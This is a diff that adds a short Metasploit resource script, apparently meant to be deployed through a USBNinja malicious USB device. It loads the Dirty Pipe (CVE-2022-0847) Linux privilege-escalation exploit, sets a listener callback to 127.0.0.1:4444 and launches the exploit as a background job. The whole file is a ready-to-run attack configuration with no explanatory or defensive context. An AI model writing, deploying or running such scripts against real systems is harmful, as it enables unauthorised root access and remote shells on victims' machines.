@@ -1,0 +1,10 @@
+# USBNinja v3 Deployment Script
+# Exploit: Dirty Pipe (CVE-2022-0847)
+# Target: linux
+# Callback: 127.0.0.1:4444
+
+use exploit/linux/local/cve_2022_0847_dirtypipe
+set LHOST 127.0.0.1
+set LPORT 4444
+set TARGET 0
+exploit -j -z
